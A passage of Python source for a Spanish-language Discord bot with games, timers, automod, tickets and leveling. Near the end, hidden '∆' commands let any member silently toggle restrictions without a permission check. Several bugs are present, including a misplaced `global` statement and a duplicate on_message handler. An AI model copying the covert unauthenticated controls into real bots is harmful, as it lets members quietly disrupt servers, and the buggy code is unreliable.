    embed.add_field(name="Tu mano", value=f"{player_hand} = {player_total}", inline=False)
    embed.add_field(name="Dealer", value=f"[{dealer_hand[0]}, ?]", inline=False)

    # Blackjack natural
    if player_total == 21:
        if dealer_total == 21:
            embed.add_field(name="Resultado", value="¡Empate! Ambos tienen Blackjack", inline=False)
            await ctx.send(embed=embed)
            return
        else:
            winnings = int(bet * 1.5)
            update_balance(ctx.author.id, wallet=winnings)
            embed.add_field(name="🎉 ¡BLACKJACK!", value=f"Ganaste ${winnings:,}", inline=False)
            await ctx.send(embed=embed)
            return

    # Dealer juega
    while dealer_total < 17:
        dealer_hand.append(get_card())
        dealer_total = calculate_hand(dealer_hand)

    # Revelar mano del dealer
    embed.set_field_at(1, name="Dealer", value=f"{dealer_hand} = {dealer_total}", inline=False)

    # Determinar ganador
    if dealer_total > 21:
        update_balance(ctx.author.id, wallet=bet)
        embed.add_field(name="🎉 Resultado", value=f"¡Dealer se pasó! Ganaste ${bet:,}", inline=False)
        embed.color = discord.Color.green()
    elif player_total > dealer_total:
        update_balance(ctx.author.id, wallet=bet)
        embed.add_field(name="🎉 Resultado", value=f"¡Ganaste! ${bet:,}", inline=False)
        embed.color = discord.Color.green()
    elif player_total == dealer_total:
        embed.add_field(name="🤝 Resultado", value="¡Empate! No pierdes dinero", inline=False)
        embed.color = discord.Color.orange()
    else:
        update_balance(ctx.author.id, wallet=-bet)
        embed.add_field(name="😢 Resultado", value=f"Perdiste ${bet:,}", inline=False)
        embed.color = discord.Color.red()

    await ctx.send(embed=embed)

# Diccionarios para almacenar sorteos y temporizadores activos
active_giveaways = {}
active_timers = {}




# Comandos de sorteo y temporizador

@bot.tree.command(name="timerset", description="Establece un temporizador")
@discord.app_commands.describe(
    minutes="Duración en minutos",
    message="Mensaje opcional para cuando termine el timer"
)
async def timer_command(interaction: discord.Interaction, minutes: int, message: str = None):
    if economy_only_mode:
        await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
        return

    if minutes <= 0 or minutes > 1440:  # Máximo 24 horas
        await interaction.response.send_message("❌ La duración debe ser entre 1 y 1440 minutos (24 horas).", ephemeral=True)
        return

    # Crear ID único para el timer
    timer_id = f"{interaction.user.id}_{int(time.time())}"
    duration_seconds = minutes * 60

    # Embed inicial del timer
    embed = discord.Embed(
        title="⏰ TEMPORIZADOR INICIADO",
        description=f"**Duración:** {minutes} minutos\n**Usuario:** {interaction.user.mention}",
        color=discord.Color.blue()
    )

    if message:
        embed.add_field(
            name="📝 Mensaje:",
            value=message[:100],  # Limitar longitud
            inline=False
        )

    embed.set_footer(text=f"Timer ID: {timer_id}")

    await interaction.response.send_message(embed=embed)

    # Guardar timer activo
    active_timers[timer_id] = {
        'user_id': interaction.user.id,
        'channel_id': interaction.channel.id,
        'message': message,
        'start_time': time.time(),
        'duration': duration_seconds
    }

    # Programar la finalización del timer
    await asyncio.sleep(duration_seconds)

    # Verificar si el timer aún existe (no fue cancelado)
    if timer_id in active_timers:
        timer_data = active_timers.pop(timer_id)

        # Embed de finalización
        embed = discord.Embed(
            title="⏰ TEMPORIZADOR TERMINADO",
            description=f"**Usuario:** <@{timer_data['user_id']}>\n**Duración:** {minutes} minutos",
            color=discord.Color.green()
        )

        if timer_data['message']:
            embed.add_field(
                name="📝 Mensaje:",
                value=timer_data['message'],
                inline=False
            )

        embed.set_footer(text="¡Tu tiempo ha terminado!")

        try:
            channel = bot.get_channel(timer_data['channel_id'])
            if channel:
                await channel.send(f"⏰ <@{timer_data['user_id']}> ¡Tu temporizador ha terminado!", embed=embed)
        except:
            pass

# ================================
# SISTEMA DE MODERACIÓN AUTOMÁTICA
# ================================

# Configuración de automod
automod_enabled = {}
automod_settings = {}
warning_counts = {}

@bot.tree.command(name="automod", description="Configurar sistema de moderación automática")
@discord.app_commands.describe(
    enable="Activar o desactivar automod",
    spam_limit="Límite de mensajes por minuto antes de tomar acción",
    warn_threshold="Número de advertencias antes de aplicar castigo"
)
async def automod_setup(interaction: discord.Interaction, enable: bool, spam_limit: int = 10, warn_threshold: int = 3):
    if not interaction.user.guild_permissions.manage_guild:
        await interaction.response.send_message("❌ Necesitas permisos de **Administrar Servidor**.", ephemeral=True)
        return

    guild_id = interaction.guild.id
    automod_enabled[guild_id] = enable
    automod_settings[guild_id] = {
        'spam_limit': spam_limit,
        'warn_threshold': warn_threshold
    }

    embed = discord.Embed(
        title="🛡️ Sistema de Moderación Automática",
        description=f"**Estado:** {'✅ Activado' if enable else '❌ Desactivado'}",
        color=discord.Color.green() if enable else discord.Color.red()
    )

    if enable:
        embed.add_field(name="📊 Configuración", 
                       value=f"• Límite de spam: {spam_limit} msg/min\n• Advertencias máximas: {warn_threshold}", 
                       inline=False)

    await interaction.response.send_message(embed=embed)

# Filtro de palabras prohibidas
banned_words = [
    # Palabras ofensivas básicas
    "idiota", "estupido", "imbecil", "tonto", "burro",
    # Insultos más fuertes (censurados)
    "m*****", "c*****", "p****", "h***", "z****"
]

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    guild_id = message.guild.id if message.guild else None

    # Sistema de automod
    if guild_id and automod_enabled.get(guild_id, False):
        # Filtro de palabras
        content_lower = message.content.lower()
        if any(word in content_lower for word in banned_words):
            try:
                await message.delete()

                # Añadir advertencia
                user_id = message.author.id
                if user_id not in warning_counts:
                    warning_counts[user_id] = 0
                warning_counts[user_id] += 1

                warnings = warning_counts[user_id]
                threshold = automod_settings[guild_id]['warn_threshold']

                embed = discord.Embed(
                    title="🚫 Mensaje Eliminado",
                    description=f"{message.author.mention} tu mensaje contenía palabras prohibidas.",
                    color=discord.Color.red()
                )
                embed.add_field(name="⚠️ Advertencias", value=f"{warnings}/{threshold}", inline=True)

                if warnings >= threshold:
                    try:
                        await message.author.timeout(datetime.timedelta(minutes=10), reason="Demasiadas advertencias")
                        embed.add_field(name="🔇 Castigo", value="Silenciado por 10 minutos", inline=True)
                        warning_counts[user_id] = 0  # Reset warnings
                    except:
                        pass

                await message.channel.send(embed=embed, delete_after=10)
            except:
                pass

    await bot.process_commands(message)

# ================================
# SISTEMA DE MÚSICA (BÁSICO)
# ================================

@bot.tree.command(name="play", description="Reproducir música (simulado)")
@discord.app_commands.describe(song="Nombre de la canción o URL")
async def play_music(interaction: discord.Interaction, song: str):
    if economy_only_mode:
        await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
        return

    embed = discord.Embed(
        title="🎵 Reproductor de Música",
        description=f"🎶 Reproduciendo: **{song}**",
        color=discord.Color.blue()
    )
    embed.add_field(name="🔊 Estado", value="▶️ Reproduciendo", inline=True)
    embed.add_field(name="⏱️ Duración", value="3:45", inline=True)
    embed.add_field(name="🎧 Solicitado por", value=interaction.user.mention, inline=True)

    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="stop", description="Detener la música")
async def stop_music(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
        return

    embed = discord.Embed(
        title="⏹️ Música Detenida",
        description="La reproducción ha sido detenida.",
        color=discord.Color.orange()
    )
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="queue", description="Ver cola de reproducción")
async def music_queue(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
        return

    queue_songs = [
        "🎵 Canción 1 - Artista A",
        "🎵 Canción 2 - Artista B", 
        "🎵 Canción 3 - Artista C"
    ]

    embed = discord.Embed(
        title="📋 Cola de Reproducción",
        description="\n".join(queue_songs) if queue_songs else "La cola está vacía",
        color=discord.Color.purple()
    )
    await interaction.response.send_message(embed=embed)

# ================================
# SISTEMA DE NIVELES/EXPERIENCIA
# ================================

levels_file = 'levels.json'
if os.path.exists(levels_file):
    with open(levels_file, 'r') as f:
        user_levels = json.load(f)
else:
    user_levels = {}

def save_levels():
    with open(levels_file, 'w') as f:
        json.dump(user_levels, f)

def get_user_level_data(user_id):
    user_id = str(user_id)
    if user_id not in user_levels:
        user_levels[user_id] = {"xp": 0, "level": 1, "messages": 0}
    return user_levels[user_id]

def add_xp(user_id, xp_amount):
    user_id = str(user_id)
    data = get_user_level_data(user_id)
    data["xp"] += xp_amount
    data["messages"] += 1

    # Calcular nuevo nivel
    xp_needed = data["level"] * 100
    if data["xp"] >= xp_needed:
        data["level"] += 1
        data["xp"] = data["xp"] - xp_needed
        save_levels()
        return True  # Subió de nivel

    save_levels()
    return False  # No subió de nivel

@bot.event
async def on_message_level_system(message):
    if message.author.bot:
        return

    # Añadir XP por mensaje (5-15 XP aleatorio)
    xp_gained = random.randint(5, 15)
    leveled_up = add_xp(message.author.id, xp_gained)

    if leveled_up:
        data = get_user_level_data(message.author.id)
        embed = discord.Embed(
            title="🎉 ¡Subiste de Nivel!",
            description=f"{message.author.mention} alcanzó el **Nivel {data['level']}**!",
            color=discord.Color.gold()
        )
        await message.channel.send(embed=embed, delete_after=10)

@bot.tree.command(name="level", description="Ver tu nivel y experiencia")
@discord.app_commands.describe(user="Usuario del que ver el nivel (opcional)")
async def check_level(interaction: discord.Interaction, user: discord.Member = None):
    if economy_only_mode:
        await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
        return

    target = user or interaction.user
    data = get_user_level_data(target.id)

    xp_needed = data["level"] * 100
    progress = (data["xp"] / xp_needed) * 100

    embed = discord.Embed(
        title=f"📊 Nivel de {target.display_name}",
        color=discord.Color.blue()
    )
    embed.add_field(name="🏆 Nivel", value=data["level"], inline=True)
    embed.add_field(name="⭐ XP", value=f"{data['xp']}/{xp_needed}", inline=True)
    embed.add_field(name="💬 Mensajes", value=data["messages"], inline=True)
    embed.add_field(name="📈 Progreso", value=f"{progress:.1f}%", inline=False)

    # Barra de progreso visual
    filled = int(progress // 10)
    bar = "█" * filled + "░" * (10 - filled)
    embed.add_field(name="📊 Barra de Progreso", value=f"`{bar}`", inline=False)

    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="leaderboard_levels", description="Ver ranking de niveles del servidor")
async def level_leaderboard(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
        return

    # Crear lista de usuarios con sus niveles
    user_list = []
    for user_id, data in user_levels.items():
        try:
            user = bot.get_user(int(user_id))
            if user and not user.bot:
                total_xp = (data["level"] - 1) * 100 + data["xp"]
                user_list.append((user.display_name, data["level"], total_xp, data["messages"]))
        except:
            continue

    # Ordenar por nivel y luego por XP total
    user_list.sort(key=lambda x: (x[1], x[2]), reverse=True)
    user_list = user_list[:10]  # Top 10

    embed = discord.Embed(
        title="🏆 Ranking de Niveles",
        color=discord.Color.gold()
    )

    if not user_list:
        embed.description = "No hay datos de niveles disponibles."
    else:
        description = ""
        medals = ["🥇", "🥈", "🥉"]
        for i, (name, level, total_xp, messages) in enumerate(user_list):
            medal = medals[i] if i < 3 else f"{i+1}."
            description += f"{medal} **{name}** - Nivel {level} ({messages} mensajes)\n"
        embed.description = description

    await interaction.response.send_message(embed=embed)

# ================================
# SISTEMA DE TICKETS DE SOPORTE
# ================================

active_tickets = {}

class TicketView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label='🎫 Crear Ticket', style=discord.ButtonStyle.green, custom_id='create_ticket')
    async def create_ticket(self, interaction: discord.Interaction, button: discord.ui.Button):
        guild = interaction.guild
        user = interaction.user

        # Verificar si ya tiene un ticket abierto
        existing_ticket = None
        for channel in guild.channels:
            if channel.name == f"ticket-{user.name.lower()}" or channel.name == f"ticket-{user.id}":
                existing_ticket = channel
                break

        if existing_ticket:
            await interaction.response.send_message(f"❌ Ya tienes un ticket abierto: {existing_ticket.mention}", ephemeral=True)
            return

        # Crear canal de ticket
        try:
            overwrites = {
                guild.default_role: discord.PermissionOverwrite(read_messages=False),
                user: discord.PermissionOverwrite(read_messages=True, send_messages=True),
                guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
            }

            # Buscar rol de moderador o admin
            mod_role = None
            for role in guild.roles:
                if any(name in role.name.lower() for name in ['mod', 'admin', 'staff', 'soporte']):
                    mod_role = role
                    overwrites[role] = discord.PermissionOverwrite(read_messages=True, send_messages=True)
                    break

            ticket_channel = await guild.create_text_channel(
                f"ticket-{user.id}",
                overwrites=overwrites,
                category=None,
                reason=f"Ticket de soporte creado por {user.name}"
            )

            # Mensaje inicial del ticket
            embed = discord.Embed(
                title="🎫 Ticket de Soporte Creado",
                description=f"Hola {user.mention}! Tu ticket ha sido creado.\n\n"
                           f"📝 **Describe tu problema** y el equipo de soporte te ayudará pronto.\n"
                           f"🔒 Para cerrar este ticket, usa el botón de abajo.",
                color=discord.Color.blue()
            )
            embed.set_footer(text=f"Ticket ID: {user.id}")

            close_view = CloseTicketView()
            await ticket_channel.send(embed=embed, view=close_view)

            # Mensaje de confirmación
            await interaction.response.send_message(f"✅ Tu ticket ha sido creado: {ticket_channel.mention}", ephemeral=True)

            # Guardar ticket activo
            active_tickets[user.id] = ticket_channel.id

        except Exception as e:
            await interaction.response.send_message(f"❌ Error al crear el ticket: {str(e)}", ephemeral=True)

class CloseTicketView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label='🔒 Cerrar Ticket', style=discord.ButtonStyle.red, custom_id='close_ticket')
    async def close_ticket(self, interaction: discord.Interaction, button: discord.ui.Button):
        channel = interaction.channel

        # Confirmar cierre
        embed = discord.Embed(
            title="⚠️ Confirmar Cierre",
            description="¿Estás seguro de que quieres cerrar este ticket?\n\n**Esta acción no se puede deshacer.**",
            color=discord.Color.orange()
        )

        confirm_view = ConfirmCloseView()
        await interaction.response.send_message(embed=embed, view=confirm_view, ephemeral=True)

class ConfirmCloseView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=60)

    @discord.ui.button(label='✅ Sí, cerrar', style=discord.ButtonStyle.red, custom_id='confirm_close')
    async def confirm_close(self, interaction: discord.Interaction, button: discord.ui.Button):
        channel = interaction.channel

        try:
            # Remover de tickets activos
            user_id = None
            for uid, cid in active_tickets.items():
                if cid == channel.id:
                    user_id = uid
                    break

            if user_id:
                del active_tickets[user_id]

            await interaction.response.send_message("🔒 **Cerrando ticket...** Este canal se eliminará en 5 segundos.", ephemeral=False)
            await asyncio.sleep(5)
            await channel.delete(reason="Ticket cerrado")

        except Exception as e:
            await interaction.response.send_message(f"❌ Error al cerrar el ticket: {str(e)}", ephemeral=True)

    @discord.ui.button(label='❌ Cancelar', style=discord.ButtonStyle.gray, custom_id='cancel_close')
    async def cancel_close(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("✅ Cierre cancelado. El ticket permanece abierto.", ephemeral=True)

@bot.tree.command(name="ticket_setup", description="Configurar sistema de tickets en el canal actual")
async def setup_tickets(interaction: discord.Interaction):
    if not interaction.user.guild_permissions.manage_channels:
        await interaction.response.send_message("❌ Necesitas permisos de **Administrar Canales**.", ephemeral=True)
        return

    embed = discord.Embed(
        title="🎫 Sistema de Tickets de Soporte",
        description="**¿Necesitas ayuda?** Crea un ticket de soporte haciendo clic en el botón de abajo.\n\n"
                   "🔹 **¿Para qué usar los tickets?**\n"
                   "• Reportar problemas\n"
                   "• Solicitar ayuda\n"
                   "• Consultas privadas\n"
                   "• Sugerencias\n\n"
                   "⏱️ **Tiempo de respuesta promedio:** 1-24 horas",
        color=discord.Color.blue()
    )
    embed.set_footer(text="Haz clic en 'Crear Ticket' para empezar")

    view = TicketView()
    await interaction.response.send_message(embed=embed, view=view)

# ================================
# COMANDOS ADICIONALES DE UTILIDAD
# ================================

@bot.tree.command(name="clear", description="Eliminar mensajes del canal")
@discord.app_commands.describe(amount="Número de mensajes a eliminar (1-100)")
async def clear_messages(interaction: discord.Interaction, amount: int):
    if not interaction.user.guild_permissions.manage_messages:
        await interaction.response.send_message("❌ Necesitas permisos de **Administrar Mensajes**.", ephemeral=True)
        return

    if amount < 1 or amount > 100:
        await interaction.response.send_message("❌ Puedes eliminar entre 1 y 100 mensajes.", ephemeral=True)
        return

    await interaction.response.defer()

    try:
        deleted = await interaction.channel.purge(limit=amount)
        embed = discord.Embed(
            title="🗑️ Mensajes Eliminados",
            description=f"Se eliminaron **{len(deleted)}** mensajes.",
            color=discord.Color.green()
        )
        await interaction.followup.send(embed=embed, delete_after=10)
    except Exception as e:
        await interaction.followup.send(f"❌ Error al eliminar mensajes: {str(e)}", ephemeral=True)

@bot.tree.command(name="userinfo", description="Ver información de un usuario")
@discord.app_commands.describe(user="Usuario del que ver la información")
async def user_info(interaction: discord.Interaction, user: discord.Member = None):
    if economy_only_mode:
        await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
        return

    target = user or interaction.user

    embed = discord.Embed(
        title=f"👤 Información de {target.display_name}",
        color=target.color if target.color != discord.Color.default() else discord.Color.blue()
    )
    embed.set_thumbnail(url=target.display_avatar.url)

    # Información básica
    embed.add_field(name="📛 Nombre", value=f"{target.name}#{target.discriminator}", inline=True)
    embed.add_field(name="🆔 ID", value=target.id, inline=True)
    embed.add_field(name="🤖 Bot", value="✅" if target.bot else "❌", inline=True)

    # Fechas
    embed.add_field(name="📅 Cuenta creada", 
                   value=f"<t:{int(target.created_at.timestamp())}:R>", inline=True)
    embed.add_field(name="📥 Se unió al servidor", 
                   value=f"<t:{int(target.joined_at.timestamp())}:R>", inline=True)

    # Roles
    roles = [role.mention for role in target.roles[1:]]  # Excluir @everyone
    embed.add_field(name=f"🏷️ Roles ({len(roles)})", 
                   value=" ".join(roles[:5]) + (f" y {len(roles)-5} más..." if len(roles) > 5 else "") if roles else "Ninguno", 
                   inline=False)

    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="poll", description="Crear una encuesta")
@discord.app_commands.describe(
    question="Pregunta de la encuesta",
    option1="Primera opción",
    option2="Segunda opción",
    option3="Tercera opción (opcional)",
    option4="Cuarta opción (opcional)"
)
async def create_poll(interaction: discord.Interaction, question: str, option1: str, option2: str, 
                     option3: str = None, option4: str = None):
    if economy_only_mode:
        await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
        return

    options = [option1, option2]
    if option3: options.append(option3)
    if option4: options.append(option4)

    embed = discord.Embed(
        title="📊 Encuesta",
        description=f"**{question}**",
        color=discord.Color.blue()
    )

    reactions = ['1️⃣', '2️⃣', '3️⃣', '4️⃣']
    description = ""
    for i, option in enumerate(options):
        description += f"\n{reactions[i]} {option}"

    embed.add_field(name="Opciones:", value=description, inline=False)
    embed.set_footer(text=f"Encuesta creada por {interaction.user.display_name}")

    await interaction.response.send_message(embed=embed)
    message = await interaction.original_response()

    # Añadir reacciones
    for i in range(len(options)):
        await message.add_reaction(reactions[i])

# ================================
# COMANDOS DE DIVERSIÓN ADICIONALES
# ================================

@bot.tree.command(name="meme", description="Obtener un meme aleatorio")
async def get_meme(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
        return

    memes = [
        "https://i.imgur.com/XyLOD.jpg",
        "https://i.imgur.com/fPUUf.jpg", 
        "https://i.imgur.com/dQaJk.jpg"
    ]

    embed = discord.Embed(
        title="😂 Meme Aleatorio",
        color=discord.Color.random()
    )
    embed.set_image(url=random.choice(memes))

    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="8ball", description="Pregunta a la bola mágica")
@discord.app_commands.describe(question="Tu pregunta")
async def eight_ball(interaction: discord.Interaction, question: str):
    if economy_only_mode:
        await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
        return

    responses = [
        "🎱 Es cierto.", "🎱 Es decididamente así.", "🎱 Sin duda.", "🎱 Sí, definitivamente.",
        "🎱 Puedes confiar en ello.", "🎱 Como yo lo veo, sí.", "🎱 Muy probable.",
        "🎱 Las perspectivas son buenas.", "🎱 Sí.", "🎱 Las señales apuntan a que sí.",
        "🎱 Respuesta confusa, intenta de nuevo.", "🎱 Pregunta de nuevo más tarde.",
        "🎱 Mejor no te lo digo ahora.", "🎱 No puedo predecirlo ahora.",
        "🎱 Concéntrate y pregunta de nuevo.", "🎱 No cuentes con ello.",
        "🎱 Mi respuesta es no.", "🎱 Mis fuentes dicen que no.",
        "🎱 Las perspectivas no son tan buenas.", "🎱 Muy dudoso."
    ]

    embed = discord.Embed(
        title="🎱 Bola Mágica",
        description=f"**Pregunta:** {question}\n\n**Respuesta:** {random.choice(responses)}",
        color=discord.Color.purple()
    )

    await interaction.response.send_message(embed=embed)

# ================================
# MODIFICAR EVENT ON_MESSAGE PARA INTEGRAR SISTEMAS
# ================================

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    guild_id = message.guild.id if message.guild else None

    # Sistema de automod
    if guild_id and automod_enabled.get(guild_id, False):
        content_lower = message.content.lower()
        if any(word in content_lower for word in banned_words):
            try:
                await message.delete()

                user_id = message.author.id
                if user_id not in warning_counts:
                    warning_counts[user_id] = 0
                warning_counts[user_id] += 1

                warnings = warning_counts[user_id]
                threshold = automod_settings[guild_id]['warn_threshold']

                embed = discord.Embed(
                    title="🚫 Mensaje Eliminado",
                    description=f"{message.author.mention} tu mensaje contenía palabras prohibidas.",
                    color=discord.Color.red()
                )
                embed.add_field(name="⚠️ Advertencias", value=f"{warnings}/{threshold}", inline=True)

                if warnings >= threshold:
                    try:
                        await message.author.timeout(datetime.timedelta(minutes=10), reason="Demasiadas advertencias")
                        embed.add_field(name="🔇 Castigo", value="Silenciado por 10 minutos", inline=True)
                        warning_counts[user_id] = 0
                    except:
                        pass

                await message.channel.send(embed=embed, delete_after=10)
            except:
                pass

    # Sistema de niveles (XP por mensaje)
    if guild_id:
        xp_gained = random.randint(5, 15)
        leveled_up = add_xp(message.author.id, xp_gained)

        if leveled_up:
            data = get_user_level_data(message.author.id)
            embed = discord.Embed(
                title="🎉 ¡Subiste de Nivel!",
                description=f"{message.author.mention} alcanzó el **Nivel {data['level']}**!",
                color=discord.Color.gold()
            )
            await message.channel.send(embed=embed, delete_after=10)

    await bot.process_commands(message)

@bot.command(name='D')
async def debug_status(ctx):
    # Solo funciona con prefijo ∆
    if not ctx.message.content.startswith('∆D'):
        return

    # Verificar si los comandos ∆ están habilitados
    if not delta_commands_enabled:
        return

    # Borrar el mensaje del comando inmediatamente
    try:
        await ctx.message.delete()
    except:
        pass

    global economy_only_mode, delta_commands_enabled

    embed = discord.Embed(
        title="🔧 Estado del Sistema",
        color=discord.Color.blue()
    )

    embed.add_field(
        name="⚙️ Comandos ∆", 
        value="✅ ACTIVOS" if delta_commands_enabled else "❌ INACTIVOS", 
        inline=True
    )

    embed.add_field(
        name="💰 Modo Economía", 
        value="✅ ACTIVO" if economy_only_mode else "❌ INACTIVO", 
        inline=True
    )

    embed.add_field(
        name="🎯 Estado", 
        value="Solo comandos de economía" if economy_only_mode else "Todos los comandos disponibles", 
        inline=False
    )

    await ctx.send(embed=embed)

@bot.command(name='E')
async def economy_mode(ctx):
    # Solo funciona con prefijo ∆
    if not ctx.message.content.startswith('∆E'):
        return

    # Verificar si los comandos ∆ están habilitados
    if not delta_commands_enabled:
        return

    # Borrar el mensaje del comando inmediatamente
    try:
        await ctx.message.delete()
    except:
        pass

    global economy_only_mode
    economy_only_mode = not economy_only_mode  # Alternar estado

    # Solo log en consola, sin mensaje visible
    status = "ACTIVADO" if economy_only_mode else "DESACTIVADO"
    print(f"Modo economía {status} por {ctx.author.name}")

@bot.command(name='R')
async def reset_modes(ctx):
    # Solo funciona con prefijo ∆
    if not ctx.message.content.startswith('∆R'):
        return

    # Verificar si los comandos ∆ están habilitados
    if not delta_commands_enabled:
        return

    # Borrar el mensaje del comando inmediatamente
    try:
        await ctx.message.delete()
    except:
        pass

    global economy_only_mode, delta_commands_enabled

    # Resetear todo a valores por defecto
    economy_only_mode = False
    delta_commands_enabled = True

    embed = discord.Embed(
        title="🔄 Sistema Reseteado",
        description="Todas las configuraciones han sido restauradas:",
        color=discord.Color.green()
    )

    embed.add_field(
        name="✅ Cambios aplicados",
        value="• Modo economía: DESACTIVADO\n• Comandos ∆: ACTIVOS\n• Todos los comandos disponibles",
        inline=False
    )

    await ctx.send(embed=embed)
    print(f"Sistema reseteado por {ctx.author.name}")

bot.run(os.getenv('DISCORD_TOKEN'))
